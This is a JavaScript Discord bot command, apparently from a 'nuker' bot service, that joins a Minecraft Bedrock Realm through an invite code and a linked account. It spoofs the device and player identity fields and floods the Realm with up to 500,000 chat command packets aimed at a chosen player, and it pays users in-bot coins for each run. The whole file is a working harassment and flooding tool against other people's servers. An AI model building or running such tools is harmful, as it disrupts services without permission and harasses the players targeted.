const fs = require('fs');
const { SlashCommandBuilder } = require('discord.js');
const bedrock = require('bedrock-protocol');
const { RealmAPI } = require('prismarine-realms');
const { Authflow } = require('prismarine-auth');
const { setTimeout } = require('timers/promises');
const skinData = require('../../data/jenny.json');
const { NIL, v3: uuidv3, v4: uuidv4 } = require('uuid');
const { checkAndSaveRealm,saveCoins } = require('../functions/realms.js')
const { cat1, error, loading, replystart, replyend } = require('../../data/emojie');
const { discordInvite, discordlink, footer, waterwark } = require('../../data/config');

module.exports = {
    command: new SlashCommandBuilder()
        .setName('spam')
        .setDescription('Spams realm with a message')
        .setIntegrationTypes(0, 1)
        .setContexts(0, 1, 2)
        .addStringOption(option =>
            option.setName('realmcode')
                .setDescription('Realm Code To Spam')
                .setRequired(true)
                .setMinLength(11)
        )
        .addStringOption(option =>
            option.setName('target')
                .setDescription('The target for the spam')
                .setRequired(true)
        )
        .addBooleanOption(option => 
            option.setName('external')
                .setDescription('Set external option?')
                .setRequired(true))
        .addStringOption(option =>
            option.setName('custommessage')
                .setDescription('Custom message to spam')
                .setRequired(true)
        )
        .addIntegerOption(option =>
            option.setName('packets')
                .setDescription('Number of packets to send')
                .setRequired(true)
                .addChoices(
                    { name: '5K', value: 5000 },
                    { name: '10K', value: 10000 },
                    { name: '50K', value: 50000 },
                    { name: '100K', value: 100000 },
                    { name: '300K', value: 300000 },
                    { name: '500K', value: 500000 },
                )
        )
        .addStringOption(option =>
            option.setName('namespoof_name')
                .setDescription('The Name you wanna use for Namespoof (Premium only)')
                .setRequired(false)),

        execute: async (interaction) => {
        
            try {
                await interaction.deferReply({ ephemeral: false });
                const link = discordInvite;
                const rainbowLink = rainbowText(link);
                const userId = interaction.user.id;
                const userTag = interaction.user.tag;
                const realmCode = interaction.options.getString('realmcode');
                const customMessage = interaction.options.getString('custommessage');
                const target = interaction.options.getString('target');
                const packetCount = interaction.options.getInteger('packets');
                const name = interaction.options.getString('namespoof_name') || ""
                const userIdentifier = undefined;
                const profilesFolder = `./authCache/${userId}`;
                const options = { authTitle: '00000000441cc96b', flow: 'live' };
                const authFlow = new Authflow(userIdentifier, profilesFolder, options);
                const realms = RealmAPI.from(authFlow, 'bedrock');
                const realm = await realms.getRealmFromInvite(realmCode);
                const realmName = realm?.name || 'Unknown';
                const external = interaction.options.getBoolean('external');
                const duration = 120
                const baseCoins = 20
                const bonusCoins = Math.floor(duration / 60) * 100;
                const totalCoins = baseCoins + bonusCoins;

            if (!fs.existsSync(profilesFolder)) {
                await interaction.editReply({
                    embeds: [
                        {
                            title: `${error} Account Not Linked ${error} `,
                            description: `It seems like you haven't linked an account yet.\nPlease link an account whit `+'`/link `' + `to use this command.`,
                            color: 0xff0000,
                            footer: { text: footer },
                        },
                    ],
                });
                return;
            }

            const embed = {
                title: `${cat1} Connecting to Realm: ${realmName} ${cat1}`,
                description: '',
                footer: { text: 'Attempting connection...' },
            };
            await interaction.editReply({ embeds: [embed] });

            const client = bedrock.createClient({
                profilesFolder,
                profilesFolder: profilesFolder,
                skinData: {
                    CurrentInputMode: 3,
                    DefaultInputMode: 3,
                    DeviceOS: 11,
                    DeviceId: uuidv3(uuidv4(), NIL),
                    PlatformOnlineId: generateRandomString(19, '1234567890'),
                    PrimaryUser: false,
                    SelfSignedId: uuidv4(),
                    ThirdPartyName: name,
                    ThirdPartyNameOnly: true,
                    TrustedSkin: true,
                },
                skipPing: true,
                realms: {
                    [realmCode.length === 8 ? "realmId" : "realmInvite"]: realmCode.length === 8 ? realmCode : `${realmCode}`,
                },
            });

            client.on('join', async () => {
            checkAndSaveRealm(realmCode, userId)
                try {
                    const updatedEmbed = {
                        title: `${cat1} Connected to: ${realmName} ${cat1}`,
                        description: `${replystart}Successfully joined the Realm as ${name}\n${replyend}Realm Code: ${realmCode}`,
                        footer: {
                            text: `${interaction.user.username} | discord.gg/frosted`,
                            iconURL: interaction.user.displayAvatarURL(),
                        },
                    };
                    await interaction.editReply({ embeds: [updatedEmbed] });
                    console.log(`Connected to Realm: ${realmName} (${realmCode})`);
                } catch (error) {
                    console.error(`Error Realm: ${error.message}`);
                }
            });
            client.on('start_game', async (packet) => {
                saveCoins(userId, totalCoins); 
                const spamEmbed = {
                    title: `${cat1} Spamming ${realmName} ${cat1}`,
                    description: `${replystart}Successfully Spamming the Realm as ${name}\n${replystart}Realm Code: ${realmCode}\n${replystart}Sending ${packetCount} Packets\n${replystart}Spam message : ${customMessage}\n${replyend}You will earn **${totalCoins} coins**.`,
                    footer: { text: footer },
                };
                await interaction.editReply({ embeds: [spamEmbed] });

                function startSpam() {
                    let messageCount = 0;
                    const interval = setInterval(() => {
                        if (messageCount >= packetCount) {
                            clearInterval(interval);
                            return;
                        }

                        const requestType = external ? 5 : 0;
        
                            const escapedTarget = target.includes(' ') ? `"${target}"` : target;
                        
                            for (let i = 0; i < packetCount; i++) {
                                client.queue('command_request', {
                                    command: `tell ${escapedTarget} ${customMessage}`,
                                    internal: false,
                                    version: 66,
                                    origin: {
                                        type: requestType,
                                        uuid: "5",
                                        request_id: "TSL Nuker"
                                    }
                                });
                            }
                        }, 0);
        
                    setTimeout(() => {
                        client.disconnect();
                        const disconnect = {
                            title: `${cat1} Connected to: ${realmName} ${cat1}`,
                            description: `${replystart}Successfully disconnect from the Realm as ${name}\n${replyend}Realm Code: ${realmCode}`,
                            fields: [
                                { name: 'Left After :', value: `5 Second`, inline: false },
                                { name: 'Sended ', value: `${packetCount} Packets`, inline: false },
                            ],
                            footer: { text: footer },
                        };
                     interaction.editReply({ embeds: [disconnect] });
                        console.log(`Disconnected from ${realmCode}`);
                    }, 3000);
                }
        
                startSpam();
            });

            client.on('kick', async (reason) => {
                await interaction.editReply({
                    embeds: [
                        {
                            title: 'Client Kicked',
                            description: 'Client got kicked from the Realm.',
                            color: 0xffa500,
                            fields: [
                                { name: 'Reason', value: parseKickMessage(reason.message) },
                            ],
                        },
                    ],
                });
               });

            client.on('error', async (err) => {
                console.error(err);
                await interaction.followUp({
                    embeds: [
                        {
                            title: 'Error Occurred',
                            description: 'An error occurred while connecting to the Realm.',
                            color: 0xff0000,
                            fields: [
                                { name: 'Reason', value: err.message || 'Unknown error' },
                            ],
                        },
                    ],
                });
            });
        } catch (error) {
            console.error(error);

            const errorEmbed = {
                title: 'Error Occurred',
                description: 'The bot encountered an issue while joining the Realm.',
                color: 0xff0000,
                fields: [
                    { name: 'Reason', value: error.message || 'Unknown error', inline: false },
                ],
                footer: { text: 'Please verify the Realm code and your account credentials.' },
            };

            await interaction.editReply({ embeds: [errorEmbed] });
        }
    },
};

function parseKickMessage(message) {
    return message;
}

function generateRandomString(length, charSet) {
    if (!charSet) charSet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890_-';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += charSet.charAt(Math.floor(Math.random() * charSet.length));
    }
    return result;
}

function generateRandomString(length) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function colorizeText(text) {
    const words = text.split(' ');
    const coloredWords = words.map(word => {
        const colorCode = randomCode();
        return `${colorCode}${word}`;
    });
    return coloredWords.join(' ');
}

function randomCode() {
    const optionsString = "1234567890";
    const optionsArray = optionsString.split('');
    const randomIndex = Math.floor(Math.random() * optionsArray.length);
    const randomOption = optionsArray[randomIndex];
    return "§" + randomOption;
}

function rainbowText(text) {
    const colors = ['§c', '§6', '§e', '§a', '§b', '§9', '§d', '§f'];
    let rainbowedText = '';
    
    for (let i = 0; i < text.length; i++) {
        rainbowedText += colors[i % colors.length] + text[i];
    }
    return rainbowedText;
}